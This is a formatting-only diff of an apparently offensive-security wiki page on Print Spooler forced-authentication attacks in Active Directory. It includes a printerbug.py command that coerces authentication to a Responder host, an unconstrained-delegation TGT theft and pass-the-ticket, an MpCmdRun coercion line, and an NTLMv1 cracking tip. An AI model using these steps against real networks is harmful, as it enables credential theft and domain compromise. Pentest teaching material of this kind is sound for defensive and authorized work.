@@ -2,8 +2,8 @@
 
 ## Spooler Service Abuse
 
-If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.  
-Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
+If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request **to the Domain Controller’s print server an **update **on new print jobs and just tell it to **send the notification to some system**.\
+Note when printer send the notification to an arbitrary systems, it needs to **authenticate against **that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
 
 ### Finding Windows Servers on the domain
 
@@ -15,7 +15,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 
 ### Finding Spooler services listening
 
-Using a slightly modified @mysmartlogin's \(Vincent Le Toux's\) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:
+Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:
 
 ```bash
 . .\Get-SpoolStatus.ps1
@@ -45,7 +45,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 ### Combining with Unconstrained Delegation
 
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it \([Pass the Ticket](pass-the-ticket.md)\).
+If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT **of the **computer account of the printer** will be **saved in** the **memory **of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Inside Windows
 
@@ -59,6 +59,5 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 
 ## Cracking NTLMv1
 
-If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).  
+If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
 _Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
-
